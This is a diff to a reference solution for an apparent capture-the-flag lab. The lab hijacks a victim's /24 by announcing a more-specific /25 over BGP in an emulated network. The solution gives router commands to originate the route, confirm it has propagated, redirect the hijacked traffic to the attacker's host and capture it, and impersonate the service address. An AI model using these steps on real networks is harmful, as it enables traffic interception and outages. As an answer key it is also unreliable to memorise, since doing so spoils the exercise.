@@ -1,58 +1,72 @@
 # Reference solution: false-origin via more-specific
 
-The win turns on longest-prefix match. The victim announces a /24. If you
-announce a /25 covering the half of the address space the target service sits
-in, every router prefers your /25 for those addresses, because a more-specific
-route always beats a less-specific one regardless of AS_PATH length or policy.
-With both transits filtering nothing, your /25 propagates unchallenged.
+The win turns on longest-prefix match. The victim announces a /24. Announce a /25
+covering the half of the address space the target service sits in, and every
+router prefers your /25 for those addresses, because a more-specific route beats
+a less-specific one regardless of AS_PATH length or policy. With both transits
+filtering nothing, your /25 propagates unchallenged.
 
 ## Steps
 
-1. Confirm the clean baseline from the collector. The victim's /24 is present,
-   originated by 65010, and there is no /25:
+1. Get onto your foothold. Locally:
 
-       ./ctl table
-       ./ctl lg | grep -A3 '203.0.113'
+       ./ctl player        # lands you on the ops host
+       foothold            # into attacker-as, straight to its vtysh
 
-2. Drop into your foothold and announce the more-specific:
+   The vtysh login is privileged already (the prompt ends in `#`), so there is no
+   enable password to deal with.
 
-       ./ctl vtysh attacker-as
+2. Announce the more-specific:
 
        configure terminal
        ip route 203.0.113.0/25 Null0
        router bgp 65020
         address-family ipv4 unicast
          network 203.0.113.0/25
-        exit-address-family
        end
 
    203.0.113.0/25 is not connected on your router, so the discard
    (`ip route ... Null0`) goes in first: it puts the prefix in the RIB so the
-   `network` statement has something to advertise. Do not `write memory`: keep
-   the change in the running config only, so `./ctl down && ./ctl up` restores a
-   clean baseline from the pristine bind-mounted config.
+   `network` statement has something to advertise. Leave the running config as is,
+   no `write memory`, so `./ctl down && ./ctl up` brings back a clean baseline.
 
-   (Via `./ctl vtysh attacker-as` you are already in enable mode. Over plain SSH
-   as `admin`, run `enable` first, password `idsl-router`.)
+   Confirm locally before you leave vtysh:
 
-3. Confirm propagation from the collector. You want a path for 203.0.113.0/25
-   whose origin AS is 65020:
+       show ip bgp 203.0.113.0/25      # your path, origin 65020
 
-       ./ctl lg
-       docker exec clab-inter-domain-gamemaster vtysh -c "show ip bgp 203.0.113.0/25 json"
+3. Check it went global. Back on the ops host:
 
-4. Data-plane bonus. From the eyeball client, the more-specific now steers the
-   request to you:
+       exit
+       lg
 
-       docker exec -it clab-inter-domain-eyeball curl -s http://203.0.113.10/
+   You want 203.0.113.0/25 in the table with a path ending in 65020, next to the
+   legitimate 203.0.113.0/24. The looking glass peers a single transit, so this is
+   one provider's vantage rather than an omniscient view, and it runs one query
+   and drops you, it is read only.
 
-   Serve your own content from attacker-as to make the flip observable (stand up
-   a listener on 203.0.113.10 inside your AS, or route that address to a host you
-   control). Propagation alone already scores the flag.
+4. Data-plane bonus: take the traffic, do not just sink it. Step 2 black-holes the
+   hijacked range at Null0, which diverts and denies but shows you nothing. Point
+   it at your ops host instead, which you do control:
+
+       foothold
+       configure terminal
+       no ip route 203.0.113.0/25 Null0
+       ip route 203.0.113.0/25 100.64.0.10
+       end
+
+   Then, on the ops host, watch the victim's traffic land on you:
+
+       tcpdump -ni eth1 dst net 203.0.113.0/25
+
+   To terminate rather than observe, give the ops host the service address and
+   answer for it (`ip addr add 203.0.113.10/32 dev eth1`, then a listener).
+   Propagation in step 3 already scores the flag; this is the interception
+   variant.
 
 ## Cleanup / reset
 
-       ./ctl vtysh attacker-as
+From the foothold:
+
        configure terminal
        router bgp 65020
         address-family ipv4 unicast
@@ -61,3 +75,10 @@ With both transits filtering nothing, your /25 propagates unchallenged.
        no ip route 203.0.113.0/25 Null0
 
 Or just `./ctl down && ./ctl up` for a clean table.
+
+## Operator cross-checks
+
+These use god-mode and belong to the operator, not the player:
+
+       ./ctl table                                                   # gamemaster, both tables
+       docker exec -it clab-inter-domain-eyeball traceroute -n 203.0.113.10
